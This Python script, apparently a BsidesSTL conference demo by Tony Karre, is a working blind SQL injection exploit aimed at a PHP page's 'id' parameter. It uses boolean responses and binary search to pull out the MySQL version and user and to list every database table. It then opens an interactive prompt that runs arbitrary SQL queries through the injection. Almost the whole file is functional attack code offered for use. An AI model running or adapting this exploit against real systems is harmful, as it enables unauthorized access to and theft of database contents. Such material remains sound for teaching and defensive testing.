#!/usr/bin/python3
#
# Tony Karre for BsidesSTL

from urllib import request as urlrequest

import urllib.parse
import sys
import re

if (len(sys.argv) != 2):
    print ("Usage: " + sys.argv[0] + " ipaddr")
    print ("Example: " + sys.argv[0] + " 10.3.42.23")
    exit(1)


baseURL = "http://" + sys.argv[1] + "/admin/exists.php?id="
phpsessid = sys.argv[1]  # optional, not needed for this demo

headers = {"Cookie": "PHPSESSID=" + phpsessid}

# in case we need cookie processing:
cookieProcessor = urlrequest.HTTPCookieProcessor()
opener = urlrequest.build_opener(cookieProcessor)


# This function performs a GET, then returns either True or False
# depending on whether the response body contains "post exists" or "post does not exist"

def invokeWeb(querystring):

    #print (baseURL + urllib.parse.quote(querystring))

    # the assumption is that we are doing a GET on url?querystring

    respbody = ""

    try:
        req = urlrequest.Request(baseURL + urllib.parse.quote(querystring), headers=headers)

        with opener.open(req) as f:
            respbody =  f.read().decode('utf-8')

    except:
        print("[-] Error hitting URL:\n", sys.exc_info(),"\n\n")
        respbody = ""
        exit(1)

    if (re.match('^.*post exists.*$', respbody, flags=re.DOTALL)):
        return True
    elif (re.match('^.*post does not exist.*$', respbody, flags=re.DOTALL)):
        return False
    else:
        print ("Error - probable SQL error\n\n" + respbody)
        return False


def getlength(item):

    maxexponent = 6  # don't go longer than 1 million
    qstringbase = "1 and length(" + item + ")"

    # given some item like "version()" or "table.column", determine the length
    # of that string as seen in the database.
    # Start by computing an upper bound to the length.

    lowerbound = 0
    upperbound = 0
    upperboundexponent = 0

    qstring = qstringbase + " > {}"

    while (invokeWeb(qstring.format(10**upperboundexponent)) and upperboundexponent < maxexponent):
        lowerbound = 10**upperboundexponent
        upperboundexponent += 1

    upperbound = 10**upperboundexponent

    # Our length is now in range lowerbound..upperbound.  Let's do a binary search to get the exact length.

    return binarySearch(lowerbound, upperbound, qstringbase)


def readDB(item):

    # start by getting the length of this item.

    itemlength = getlength(item)

    if (itemlength < 0):
        print("Could not determine the length of " + item)
        return ""

    # now that we have the length of this item, iterate on it to generate all of the characters.

    qstringbase = "1 and ascii(substr(" + item + ",{},1))"
    outputstring = ""

    for i in range(itemlength):
        outputstring = outputstring + chr(binarySearch(0, 127, qstringbase.format(i + 1)))

    return outputstring


# binary search
#  l = left boundary
#  r = right boundary

def binarySearch(l, r, qstringbase):

    while l <= r:

        mid = l + (r - l) // 2;

        # Check if len is the mid
        if invokeWeb((qstringbase + " = {}").format(mid)):  # arr[mid] == x:
            return mid

        # If x is greater, ignore left half
        elif invokeWeb((qstringbase + " >= {}").format(mid)):  #  arr[mid] < x:
            l = mid + 1

        # If x is smaller, ignore right half
        else:
            r = mid - 1

    # If we reach here, then the element
    # was not present
    return -1



print ("MySql version = " + readDB("version()"))
print ("MySql user = " + readDB("user()"))

print ("\n[+] Dumping table definitions...\n")
#
numtables = int(readDB("(select count(*) from information_schema.tables)"))
#
for i in range(numtables):
    schema_tablename = readDB("(select concat(table_schema,'.',table_name) from information_schema.tables limit " + str(i) + ",1)")
    print(schema_tablename)

#    schemaname = schema_tablename.split('.')[0]
#    tablename = schema_tablename.split('.')[1]
#
#    numcolumns = int(readDB("(select count(*) from information_schema.columns where table_schema = '" + schemaname + "' and table_name = '" + tablename + "')"))
#
#    for j in range(numcolumns):
#        columndata = readDB("(select concat(column_name,'.',data_type) from information_schema.columns where table_schema = '" + schemaname + "' and table_name = '" + tablename + "' limit " + str(j) + ",1)")
#        print("\t|--- " + columndata.split('.')[1] + "  " + columndata.split('.')[0])
#
#    print("")
#
print("")

print ("[+] Dropping into a SQL commmand line now...\n")
print ('Your query must result in a scalar expression.')
print ('Example query: now()')
print ('Example query: select count(*) from blog.posts')
print ('Example query: select concat(case when published is null then "null" else published end," - ",title) from blog.posts limit 0,1\n')

keepgoing = True
sql = ""

while keepgoing:

    sql = input('sql [quit] > ')

    if (sql == "quit" or sql == "q"):
        print("[+] quitting.")
        keepgoing = False
    elif sql:
        print (readDB("(" + sql + ")"))  # adding parens to force this to be a subquery




